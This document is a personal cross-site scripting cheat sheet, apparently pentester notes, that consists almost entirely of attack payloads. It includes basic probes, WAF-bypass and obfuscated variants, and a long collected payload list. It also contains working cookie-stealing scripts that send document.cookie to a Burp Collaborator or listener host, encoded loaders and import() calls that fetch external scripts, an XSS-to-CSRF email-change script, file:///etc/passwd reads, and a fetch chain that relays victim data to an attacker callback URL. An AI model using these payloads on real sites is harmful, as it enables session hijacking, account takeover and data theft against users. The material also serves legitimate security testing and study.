# XSS

Cheat Sheet : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

"sink" refers to a point in the code where user-controlled data is incorporated into the web page's HTML or JavaScript

`<script>alert(1)</script>`

`"><svg onload=alert(1)>`

`<img src=1 onerror=alert(1)>`

`javascript:alert(document.cookie)`  -- In href senario

`"onmouseover="alert(1)`

`javascript:alert(1)`

`'-alert(1)-'`

`<img%20src=1%20onerror=alert(1)>`

`{{$on.constructor('alert(1)')()}}`  - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`\"-alert(1)}//` - DOM

`<><img src=1 onerror=alert(1)>`  - where 1st angle brackets are removed by server

`<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'` Custom tags

`<svg><animatetransform onbegin=alert(1)>`  SVG Injection to XSS

`</script><script>alert(1)</script>`  single quote and backslash escaped

`\'-alert(1)//` angle brackets and double quotes HTML-encoded and single quotes escaped

`${alert(1)}` into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

`<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`   To Steal Cookies, cookies will be send to us.

XSS to CSRF:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>` Reflected XSS with event handlers and href attributes blocked

`<>javascript:alert(document.cookie);`

`<>//google.com` - open redirect

`<script> window.location.href = 'https://malicious-site.com'; </script>`  Open Redirect via XSS

`<script> window.location.replace("www.google.com");</script>`  Open Redirect via XSS

`<script>new Image().src='http://0.0.0.0:4444/?cookie=' + encodeURI(document.cookie);</script>` - Stealing Cookie via XSS

---

`>>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta` reflected input

`var a = document[.]querySelector('[nonce]');` 
![[Pasted image 20240527171129.png]]


```
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>  
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>  
<math><x xlink:href=javascript:confirm`1`>click  
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/  
<svg onload=alert&#0000000040document.cookie)>  
  
JavaScript://%250Aalert?.(1)//  
'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->  
</Title/</Style/</Script/</textArea/</iFrame/</noScript>  
\74k<K/contentEditable/autoFocus/OnFocus=  
/*${/*/;{/**/(alert)(1)}//><Base/Href=//[google.com](http://google.com/)\76-->  
  
  
<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//  
  
xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>  
  
javascript:%ef%bb%bfalert(XSS)  
  
<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">  
  
<svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">  
  
"><video><source onerror=eval(atob([http://this.id](http://this.id/))) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>  
  
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;  
  
  
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>  
  
"`'><script>\xE2\x80\x87javascript:alert(1)</script>  
  
  
<img/src=x onError="`${x}`;alert(`Hello`);">  
"`'><script>\xE2\x80\x87javascript:alert(1)</script>  
  
"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F  
  
"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>  
  
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
```

XSS payload to get /etc/passwd file 

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](http://x.open/)(‘GET’,’file:///etc/hosts’);x.send();</script>


<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](http://x.open/)(‘GET’,’file:///etc/passwd’);x.send();</script>


<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};[x.open](http://x.open/)(‘GET’,’file:///some/file’);x.send();</script>
```

XSS to SSRF

```
Input the following code in the vulnerable field:  
<iframe src="http://localhost/some/directory"></iframe>  
  
You can also read local files:  
<iframe src="file:///C:/Windows/win.ini" width="500" height="500">
```

Reflected XSS

`abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e`  --> 

```
abc`;return+false});});alert`xss`;</script>
```

`%60%2balert/**/(1)%2b%60`  --> `+alert/**/(1)+` 

WAF Bypass

`<ScRiPt></sCrIpT>`

`<h1 oNLY OnMouseover=prompt('XSS')>`

`+%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--`

`<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>`

https://github.com/freelancermijan/my-payloads/blob/main/XSS/xss-collected.txt

```
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
';k='e'%0Atop['al'+k+'rt'](1)//
'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
<svg/onload=window["al"+"ert"]1337>
<Img Src=OnXSS OnError=confirm(1337)>
<Svg Only=1 OnLoad=confirm(document.domain)>
<svg onload=alert&#0000000040document.cookie)>
<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
<Img Src=//X55.is OnLoad%0C=import(Src)>
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
">'><details/open/ontoggle=confirm('XSS')>
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
<svg onload='new Function["Y000!"].find(al\u0065rt)'>
<Img Src=//X55.is OnLoad%0C=import(Src)>
<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
lert&#x000000028;origin&#x000029;>
/(A(%22onerror='alert%60123%60'test))/
<Svg On Only=1 Onload=alert(1337)>
"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
ab@gmail.com'\"><svg/onload=alert(/xss/)>
http://example.com/services"><script>alert(1)</script>/services/
KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
><script%20>alert(document.domain)<%2fscript>
"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
"><img/src/onerror=import('//domain/')>"@yourdomain
013371337;ext=<img/src/onerror=import('//domain/')>
<Svg Only=1 OnLoad=confirm(document.domain)>
<Svg/OnLoad=alert(1337)>"@gmail.com
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
<svg onload=alert&#0000000040document.cookie)>
<svg onload=alert&#0000000040"1")><””>
<Img Src=//X55.is OnLoad%0C=import(Src)>
%3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
%3Csvg%20onload=alert(%22MrHex88%22)%3E
%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
"><svg onmouseover="confirm&#0000000040document.domain)
'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
<a/href="javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">ClickMe
<Script>window.valueOf=alert;window%2B1</Script>
<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
1%22onfocus=%27alert%28document.cookie%29%27%20autofocus=
1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)> 
- 1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")
'"><img src=x onerror=alert("xss!")>.pdf
"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
"><track/onerror='confirm`1`'>
%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2Fxss.today%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E
<vIdeO><sourCe onerror="['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])">
<video><source onerror="alert.constructor.constructor('return this')().alert('‏0f')">
<a href="#" id="uniqueLink">Click me</a> <script> (function() { var a = ['\x6F\x70\x65\x6E', '\x77\x72\x69\x74\x65', '\x63\x6C\x6F\x73\x65', '\x70\x72\x69\x6E\x74', '\x61\x6C\x65\x72\x74']; var b = ['@', 'h', 'x', 'l', 'x', 'm', 'j']; var c = ['B', '1', 'P', '4', '$', '$']; document.getElementById('uniqueLink').onclick = function() { var w = window[a[0]](); w.document[a[1]](b.join('')); w.document[a[2]](); w[a[3]](); window[a[4]](c.join('')); }; })(); </script>
<sCrIpT>(function(){var a=[97,108,101,114,116];var
b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>
<DiV sTylE="WidTH:100&#37;;HeIgHt:100vH&#59;" oNpOINteROvEr="var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);"></dIV>
<div style="width:100%;height:100vh;" onpointerover="[][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))()"> </div>
<div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
<div onpointerover="javascript:alert(document.domain)" style="width:100%;height:100vh;"></div>
<svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>
<svg onload="alert(1)"></svg>
jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
<math><x xlink:href=javascript:confirm`1`>click
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<svg onload=alert&#0000000040document.cookie)>
JavaScript://%250Aalert?.(1)//
'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
</Title/</Style/</Script/</textArea/</iFrame/</noScript>
\74k<K/contentEditable/autoFocus/OnFocus=
/*${/*/;{/**/(alert)(1)}//><Base/Href=//google.com\76-->
<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
javascript:%ef%bb%bfalert(XSS)
<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
<svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">
"><video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
<img/src=x onError="`${x}`;alert(`Hello`);">
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
<svg/onload=location=‘javas’%2B‘cript:’%2B
‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)
<svg/onload=location=/javas/.source%2B/cript:/.source%2B
/ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)
"'`//><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE"))>
"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
';k='e'%0Atop['al'+k+'rt'](1)//
"';k='e'%0Atop['al'+k+'rt'](1)//"
<Img Src=//X55.is OnLoad%0C=import(Src)>
<img/src/onerror=alert/1337/(1)>
<img/src/onerror=alert//&NewLine;(2)>
<img/src/onerror=alert&sol;&sol;(3)>
'"/><script%20>alert(document.domain)<%2fscript>.css
<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//
'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
```

Load External Resource (url encode)

```
jQuery.getScript('url')
```

url encode 

```
'+eval(atob('base64code'))+'
```

changing data (post request) with XSS

This will send a request on behalf of the victim user to change the details

we can set also mode to `no-cors` and for credentials `include`

```
fetch('url',{
method : 'POST',
mode: 'same-origin',
credentials : 'same-origin',
headers : {
'Content-Type' : 'application/x-www-form-urlencoded'
},
body:'actual_body_from_request'
})
```


Get some data from the application by visiting a page and capture the response and log it (or send back to us)

```
fetch('url', {
    method: 'POST',
    mode: 'same-origin',
    credentials: 'same-origin'
})
.then(response => response.json())
.then(data => {
    fetch('attacker_url/callback?' + encodeURIComponent(JSON.stringify(data)), {
        mode: 'no-cors'
    });
});
```

